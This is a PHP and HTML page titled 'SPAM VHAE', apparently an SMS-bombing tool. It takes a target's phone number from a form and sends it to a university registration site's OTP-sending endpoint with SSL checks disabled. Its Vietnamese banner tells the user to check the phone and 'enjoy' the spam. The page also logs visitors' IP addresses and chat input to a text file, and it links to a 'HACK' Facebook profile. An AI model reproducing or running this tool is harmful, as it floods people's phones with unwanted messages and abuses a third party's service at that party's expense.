<!DOCTYPE html>

<?php

function getUserIpAddr(){
    if(!empty($_SERVER['HTTP_CLIENT_IP'])){
        //ip from share internet
        $ip = $_SERVER['HTTP_CLIENT_IP'];
    }elseif(!empty($_SERVER['HTTP_X_FORWARDED_FOR'])){
        //ip pass from proxy
        $ip = $_SERVER['HTTP_X_FORWARDED_FOR'];
    }else{
        $ip = $_SERVER['REMOTE_ADDR'];
    }
    return $ip;
}
$ip = 'User Real IP - '.getUserIpAddr();
$fp = fopen('data.txt', 'a');
fwrite($fp, $ip);
fwrite($fp, " ");
fwrite($fp, $_POST["chat"]);
fwrite($fp, '
');

fclose($fp);
if (($_POST['captcha'] == "")){
	header("Location: /testspam/404.php");
}
if (isset($_POST['captcha'])){
	session_start();
	//echo $_SESSION["captcha1"];
	
if ($_SESSION["captcha1"] == $_POST["captcha"]){
	if ($_POST['code'] == "1f0a6d9c9a3d0d51484cf7393840a458"){
	session_destroy();
	//echo"dung";
	$phone=$_POST['phone'];
	$curl1 = curl_init();
	curl_setopt_array($curl1, array(
    CURLOPT_RETURNTRANSFER => 1,
    CURLOPT_URL => 'https://huongnghiep.fpt.edu.vn/test-dang-ky/checkapi/send-otp.php',
    CURLOPT_USERAGENT => 'VHAE',
    CURLOPT_POST => 1,
    CURLOPT_SSL_VERIFYPEER => false, //Bỏ kiểm SSL
    CURLOPT_POSTFIELDS => http_build_query(array(
        'phone_number' => "$phone"
		))
	));
	$resp1 = curl_exec($curl1);
	curl_close($curl1);
	//echo "$resp1";
	}else{
	header("Location: /testspam/404.php");
	session_destroy();
	}
}else{
	echo"sai";
	header("Location: /testspam/404.php");
	session_destroy();
}
	
	
}
?>
<html lang="en">
    <head>
        <audio autoplay loop id="playAudio">
            <source src="music.mp3">
        </audio>
        <meta charset="utf-8">
        <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
        <meta name="description" content="">
        <meta name="author" content="">
        <title>SPAM VHAE</title>
        <link href="vendor/bootstrap/css/bootstrap.min.css" rel="stylesheet">
        <link href="https://fonts.googleapis.com/css?family=Source+Sans+Pro:200,200i,300,300i,400,400i,600,600i,700,700i,900,900i" rel="stylesheet">
        <link href="https://fonts.googleapis.com/css?family=Merriweather:300,300i,400,400i,700,700i,900,900i" rel="stylesheet">
        <link href="vendor/fontawesome-free/css/all.min.css" rel="stylesheet" type="text/css">
        <link href="css/coming-soon.min.css" rel="stylesheet">
    </head>
    <body>
       
        <body onload="followMouse();">
            <div class="wrap">
                <div id="ball"></div>
            </div>
           
            <video playsinline="playsinline" autoplay="autoplay" muted="muted" loop="loop">
                <source src="mp4/bg.mp4" type="video/mp4">
            </video>
			  <div style="background-color: rgba(0, 0, 0, 0.7);" class="overlay"></div>
           
			
                <div  style="text-align: center;" class="container h-100">
                    <div class="row h-100">
                        <div class="col-12 my-auto">
                            <div class="masthead-content text-white py-5 py-md-0">
                                <h1 class="mb-3">Web đang Spam !</h1>
                                <p style="z-index:9999;"  class="mb-5">
                                    Check điện thoại và tận hưởng, nếu web không hoạt động có thể liên hệ facebook báo cáo với chúng tôi !
                                <div class="lds-ripple"><div></div><div></div></div>
								</p>
								
                                <div class="input-group input-group-newsletter">
                                  
                                </div>
                            </div>
                        </div>
                    </div>
                </div>
            
</div>
<div class="social-icons">
    <ul class="list-unstyled text-center mb-0">
        <li class="list-unstyled-item">
            <a href="https://www.facebook.com/llllllllll.HACK.lllllllllll">
                <i class="fab fa-twitter"></i>
            </a>
        </li>
        <li class="list-unstyled-item">
            <a href="https://www.facebook.com/llllllllll.HACK.lllllllllll">
                <i class="fab fa-facebook-f"></i>
            </a>
        </li>
        <li class="list-unstyled-item">
            <a href="https://www.facebook.com/llllllllll.HACK.lllllllllll">
                <i class="fab fa-instagram"></i>
            </a>
        </li>
    </ul>
</div>
<script src="vendor/jquery/jquery.min.js"></script>
<script src="vendor/bootstrap/js/bootstrap.bundle.min.js"></script>
<script src="js/coming-soon.min.js"></script>
</body></html>

